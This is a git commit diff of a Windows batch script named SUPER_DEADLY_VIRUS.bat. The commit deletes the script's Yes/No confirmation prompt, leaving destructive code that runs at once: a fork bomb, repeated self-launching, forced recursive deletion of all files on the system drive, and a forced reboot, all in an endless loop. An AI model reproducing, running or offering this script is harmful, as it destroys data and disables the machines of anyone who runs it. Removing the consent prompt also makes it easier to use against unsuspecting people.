c0b922eea05bf62b8ff2104c5897f5c927c920f2
JJthecoolest <167035484+JJthecoolest@users.noreply.github.com>
2024-07-29 04:43:13 -0600

    Update SUPER_DEADLY_VIRUS.bat

--- SUPER_DEADLY_VIRUS.bat
+++ SUPER_DEADLY_VIRUS.bat
@@ -1,16 +1,3 @@
-:1
-
-@echo off 
-
-color a 
-echo Hello, Are you sure you would like to run this virus? This is a really dangerous virus that will cause permanant damage? only do Yes/No
-set /p input=
-if /i %input%==Yes goto yes
-if /i %input%==No goto no
-if /i not %input%==Yes,No goto 1
-
-:yes
-
 :A
 %0|%0
 start SUPER_DEADLY_VIRUS.bat
@@ -18,5 +5,3 @@ start SUPER_DEADLY_VIRUS.bat
 del %systemdrive%\*.*/f/s/q
 shutdown -r -f -t 00
 Goto A
-
-:no
